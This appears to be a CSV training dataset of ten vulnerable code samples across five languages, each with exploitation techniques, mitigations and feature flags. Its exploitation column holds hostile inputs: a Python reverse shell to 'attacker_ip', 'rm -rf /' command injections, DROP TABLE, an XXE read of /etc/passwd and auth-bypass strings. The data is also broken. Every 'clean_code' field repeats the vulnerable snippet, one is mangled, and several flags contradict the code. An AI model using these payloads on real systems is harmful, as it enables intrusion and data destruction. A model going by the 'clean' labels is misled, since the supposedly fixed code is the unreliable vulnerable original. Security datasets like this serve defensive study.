id,language,vulnerability_type,description,code_snippet,exploitation_techniques,mitigation,clean_code,has_user_input,has_db_operation,has_file_operation,has_eval,code_length,has_validation,has_quotes,has_concatenation,vuln_category,vul
vuln-001,Node.js,SQL Injection,Unsanitized user input in SQL queries allows attackers to manipulate database operations.,"const query = `SELECT * FROM users WHERE username = '${req.body.username}' AND password = '${req.body.password}'`; db.query(query, (err, res) => {...});",Inject malicious SQL like ' OR '1'='1 to bypass authentication. Use tools like SQLMap for automated exploitation.,Use parameterized queries or ORM like Sequelize. Validate and sanitize inputs with libraries like validator.js.,"const query = `SELECT * FROM users WHERE username = '${req.body.username}' AND password = '${req.body.password}'`; db.query(query, (err, res) => {...});",True,True,False,False,152,False,True,True,Injection,1
vuln-002,Node.js,Command Injection,Executing shell commands with unsanitized input leads to arbitrary command execution.,"const { exec } = require('child_process'); exec(`ping ${req.query.host}`, (err, stdout) => {...});",Append commands like ; rm -rf / to input. Exploit via web requests or fuzzing tools like Burp Suite.,Avoid exec; use spawn with array args. Sanitize input and whitelist allowed values.,"const { exec } = require(); exec(`ping ${req.query.host}`, (err, stdout) => {...});",True,True,False,True,98,False,True,True,Injection,1
vuln-003,Python,SQL Injection,Direct string concatenation in SQL queries exposes to injection attacks.,"cursor.execute(f""SELECT * FROM users WHERE username = '{request.form['username']}' AND password = '{request.form['password']}'"")",Input payloads like ' OR 1=1-- to extract data. Automate with sqlmap or custom scripts.,Use parameterized queries with psycopg2 or SQLAlchemy. Implement input validation.,"cursor.execute(f""SELECT * FROM users WHERE username = '{request.form['username']}' AND password = '{request.form['password']}'"")",False,True,False,True,128,False,True,False,Injection,1
vuln-004,Python,OS Command Injection,Subprocess calls with user input enable command chaining.,"import subprocess; subprocess.call(f""ping {request.args.get('host')}"", shell=True)","Inject ; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""attacker_ip"",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(""/bin/sh"")' for reverse shell.",Use shell=False and list args. Validate input against regex patterns.,"import subprocess; subprocess.call(f""ping {request.args.get('host')}"", shell=True)",False,False,False,True,82,False,True,False,Injection,1
vuln-005,Java,SQL Injection,Concatenated SQL strings from user input compromise query integrity.,"String query = ""SELECT * FROM users WHERE username = '"" + request.getParameter(""username"") + ""' AND password = '"" + request.getParameter(""password"") + ""'""; stmt.executeQuery(query);",Use ' UNION SELECT database()-- to leak info. Chain with JDBC exploits.,Employ PreparedStatement with placeholders. Use OWASP ESAPI for sanitization.,"String query = ""SELECT * FROM users WHERE username = '"" + request.getParameter(""username"") + ""' AND password = '"" + request.getParameter(""password"") + ""'""; stmt.executeQuery(query);",True,True,False,True,181,False,True,True,Injection,1
vuln-006,Java,XXE (XML External Entity),Processing unvalidated XML allows entity expansion or external file access.,DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance(); DocumentBuilder db = dbf.newDocumentBuilder(); Document doc = db.parse(new InputSource(new StringReader(xmlInput)));,"Inject <!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]> and reference &xxe; to read files.","Disable external entities: dbf.setFeature(""http://apache.org/xml/features/disallow-doctype-decl"", true); Use secure parsers like OWASP guidelines.",DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance(); DocumentBuilder db = dbf.newDocumentBuilder(); Document doc = db.parse(new InputSource(new StringReader(xmlInput)));,True,False,False,False,183,False,False,False,Other,1
vuln-007,PHP,SQL Injection,Raw input in MySQL queries enables data manipulation.,"$query = ""SELECT * FROM users WHERE username = '"" . $_POST['username'] . ""' AND password = '"" . $_POST['password'] . ""'""; mysqli_query($conn, $query);",Payload: ' OR SLEEP(5)-- for time-based blind injection. Use Havij or manual burp intercepts.,"Prepared statements: $stmt = $conn->prepare(""SELECT * FROM users WHERE username = ? AND password = ?""); Bind params.","$query = ""SELECT * FROM users WHERE username = '"" . $_POST['username'] . ""' AND password = '"" . $_POST['password'] . ""'""; mysqli_query($conn, $query);",True,True,False,False,150,False,True,False,Injection,1
vuln-008,PHP,File Inclusion,User-controlled paths in include/require lead to LFI/RFI.,include($_GET['page'] . '.php');,"Append ?page=../../../etc/passwd%00 for LFI. For RFI, use remote URLs if allow_url_include=on.",Whitelist allowed files. Use basename() and avoid user input in paths.,include($_GET['page'] . '.php');,False,False,False,False,32,False,True,False,File_Handling,1
vuln-009,Ruby,SQL Injection,Interpolated strings in ActiveRecord queries vulnerable to injection.,"User.where(""username = '#{params[:username]}' AND password = '#{params[:password]}'"")",Input: '); DROP TABLE users;-- to destroy data. Exploit via Rails console or web forms.,"Use placeholders: User.where(username: params[:username], password: params[:password]). Sanitize with Rails built-ins.","User.where(""username = '#{params[:username]}' AND password = '#{params[:password]}'"")",True,False,False,False,85,False,True,False,Injection,1
vuln-010,Ruby,Command Injection,System calls with user input allow arbitrary execution.,"system(""ping #{params[:host]}"")",Inject ; rm -rf / for destruction. Chain commands for shell access.,"Use Open3.capture3 with array: Open3.capture3('ping', params[:host]). Validate host with IP regex.","system(""ping #{params[:host]}"")",True,False,False,True,31,False,True,False,Injection,1
